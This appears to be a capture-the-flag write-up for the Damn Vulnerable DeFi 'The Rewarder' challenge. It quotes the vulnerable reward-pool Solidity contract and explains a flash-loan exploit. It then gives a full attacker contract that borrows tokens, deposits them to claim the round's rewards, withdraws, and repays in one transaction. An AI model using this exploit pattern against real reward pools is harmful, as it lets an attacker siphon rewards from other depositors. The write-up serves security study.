# The Rewarder #

The get all the reward token. 

we wait till when the REWARDS_ROUND_MIN_DURATION has reached(5days). 

There are 4 contract involved in this challenge. but we will be focusing on the `TheRewarderPool` contract.  


`pragma solidity ^0.6.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";

contract TheRewarderPool {

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    uint256 public lastSnapshotIdForRewards;
    uint256 public lastRecordedSnapshotTimestamp;

    mapping(address => uint256) public lastRewardTimestamps;

    // Token deposited into the pool by users
    DamnValuableToken public liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public accToken;
    
    // Token in which rewards are issued
    RewardToken public rewardToken;

    // Track number of rounds
    uint256 public roundNumber;

    constructor(address tokenAddress) public {
        // Assuming all three tokens have 18 decimals
        liquidityToken = DamnValuableToken(tokenAddress);
        accToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        require(amountToDeposit > 0, "Must deposit tokens");
        
        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
        );
    }

    function withdraw(uint256 amountToWithdraw) external {
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    }

    function distributeRewards() public returns (uint256) {
        uint256 rewardInWei = 0;

        if(isNewRewardsRound()) {
            _recordSnapshot();
        }        
        
        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (totalDeposits > 0) {
            uint256 reward = (amountDeposited * 100) / totalDeposits;

            if(reward > 0 && !_hasRetrievedReward(msg.sender)) {                
                rewardInWei = reward * 10 ** 18;
                rewardToken.mint(msg.sender, rewardInWei);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewardInWei;     
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = accToken.snapshot();
        lastRecordedSnapshotTimestamp = block.timestamp;
        roundNumber++;
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
            lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}`

how the hack will be carried out

we borrow the `DamnValuableToken` from the `flasloaner` contract. 
we deposit the token to the `TheRewarderPool` contract which will trigger the `distributeRewards` function and the reward will be distributed to us. we get the reward, we click on `withdraw` fucntion which will send the `DamnValuableToken`token that we borrowed back to us. we deposit the DamnValuableToken back to the flashloan contract. 

The loan is paid back and we've gotten the reward

how to implement the hack"

`pragma solidity ^0.6.0;

import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract HackReward {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public reward;

    constructor(address _pool, address _token, address _rewardPool, address _reward) public {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = RewardToken(_reward);
    }

    fallback() external {
        uint bal = token.balanceOf(address(this));

        token.approve(address(rewardPool), bal);
        rewardPool.deposit(bal);
        rewardPool.withdraw(bal);

        token.transfer(address(pool), bal);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}`

How this works?
we call the `attack` function in `HackReward` contract which calls the `flashloan` function in the `FlashLoanerPool` contract, so we get the loan. the `FlashLoanerPool` contract makes a call to our contract calling `receiveFlashLoan`. 
wondering, why we have some function call in the fallback contract?. when the `flashloan` makes a callm`receiveFlashLoan` to get back the loan, the function isn't available in our `HackReward` contract so the call falls back to the `fallback` function and run all the fucntion calls in it.

in our `fallback` function, we we deposit `DamnValuableToken` that we got from the `flashloan` contract to the `TheRewarderPool` contract, get the reward,  withdraw our `DamnValuableToken` back and we deposit the loan that we borrowed back to the `FlashLoanerPool` contract. so the loan is pay back

back to the `attack` function, the `flashloan` call has ended and the `transfer` call is trigger so that the msg.sender gets the reward token in his address

Solution to the challenge can  be found [here](https://github.com/Ultra-Tech-code/damn-vulnerable-defi/blob/d474185e41b8ef04e8cef5c5dbb04c2b6d11717a/test/the-rewarder/the-rewarder.challenge.js#L65) 